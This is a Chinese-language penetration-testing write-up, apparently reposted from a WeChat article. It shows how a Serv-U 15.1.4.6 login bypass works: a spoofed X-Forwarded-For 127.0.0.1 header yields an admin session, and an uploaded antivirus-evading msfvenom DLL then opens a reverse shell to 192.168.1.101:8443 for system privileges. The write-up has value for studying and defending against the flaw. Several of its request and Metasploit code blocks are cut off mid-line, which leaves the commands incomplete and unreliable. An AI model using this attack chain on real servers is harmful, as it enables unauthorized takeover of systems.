# 如何在渗透测试过程中发现并利用Serv-U漏洞进行操作系统提权

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzIxNjQ0MTEwMg==&mid=2247484337&idx=3&sn=da3ebd527210ad018362c93876f419c6&chksm=97884bd0a0ffc2c68d1cec2349a5b7ce07e879e6520b8ece5a388220456068ad850dbc905288&scene=126&sessionid=1681668128#rd](http://mp.weixin.qq.com/s?__biz=MzIxNjQ0MTEwMg==&mid=2247484337&idx=3&sn=da3ebd527210ad018362c93876f419c6&chksm=97884bd0a0ffc2c68d1cec2349a5b7ce07e879e6520b8ece5a388220456068ad850dbc905288&scene=126&sessionid=1681668128#rd)

最近，在做一个外网渗透测试的过程中，发现了SolarWinds文件共享程序Serv-U的一个漏洞，通过该漏洞我获得了Serv-U的管理权限，并能以系统用户身份执行远程代码，成功完成操作系统提权。在此，我在Win7虚拟机中安装Serv-U程序，对该漏洞作出验证。

![](../Images/17abbc02955746de18c391aef7caaebf.png)

## 前期发现

Serv-U安装之后，不需要进行任何配置，其默认的Web服务端口为127.0.0.1，由于是本地服务器地址，即使提供外部服务也不需要更改此IP。

![](../Images/3524672359769fa7225ddb82c72ec511.png)

基于这个Web服务端，我利用Burp Suite的Spider功能来发现了其*/?Command=Login*请求点可能存在问题，之后，继续利用Burp Suite的Scanner功能，用包含X-Forwarded-For头的POST请求对该点发起fuzz攻击，来观察其响应结果。没过一会，通过对这些响应信息的手工验证后发现，当提交的登录请求中包含了X-Forwarded-For头为127.0.0.1的POST请求信息时，Serv-U程序将以本地管理员身份响应一个有效的Session会话。

```
POST /?Command=Login HTTP/1.1Host: 127.0.0.1:43958
Accept: 
```

```
HTTP/1.0 200 OK
Server: Serv-U/15.1.4.6
Date: Mon, 30 Jan 2017 16:47:40 GMT
Accept-Encoding: deflate
Connection: close
X-Frame-Options: sameorigin
X-Same-Domain: 1
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Type: text/html
```

  

  

虽然该POST请求通过Firefox浏览器会产生一个如下的错误提示：

![](../Images/f86b2aad0cd590c353c086f3ba1a3cb4.png)

但其本地管理员身份的Session会话却是有效的，利用该Cookie构造GET请求：

  

```
GET / HTTP/1.1Host: 127.0.0.1:43958
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,
```

  

```
HTTP/1.0 200 OK
Server: Serv-U/15.1.4.6
Date: Mon, 30 Jan 2017 16:48:52 GMT
Accept-Encoding: deflate
Connection: close
X-Frame-Options: sameorigin
X-Same-Domain: 1
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Type: text/html
```

  

可以顺利以管理员身份登录Serv-U管理后台：

![](../Images/ca47f90c2cfc4159664c5495a60a32b0.png)

## 进一步利用

经过一番研究发现，攻击者可以利用*http://127.0.0.1:43958/Admin/ServerLimits.htm*页面下的集成库文件导入功能（intergration library），上传并执行任意DLL文件：

![](../Images/88ffc2dc2533bda809e57b01a16e2019.png)

这里，我用msfvenom来制作免杀的恶意DLL文件MFC100PWN.dll，如下：

  

```
root@6c656f
```

  

![](../Images/99bac85aea8e0dd070003dd75f3d1d76.png)

该DLL文件将会向192.168.1.101:8443执行反弹连接，所以，这里用Metasploit开启一个监听端listener：

  

```
msf > use exploit/multi/
```

  

## 操作系统提权  

把MFC100PWN.dll文件通过Serv-u web client上传至 目录”C:\\Program Files\\RhinoSoft\\Serv-U”：

![](../Images/e68aac743a28653876714653882609ab.png)

![](../Images/50ce66f1ee8b15a35e634a7ba02c3858.png)

执行该DLL文件：

![](../Images/e49750d197c693f3c0f18fd6ace3cc87.png)

不出意外，通过该DLL文件的反弹shell，我们获得了Serv-u所在系统的管理员权限：

  

```
msf exploit(
```
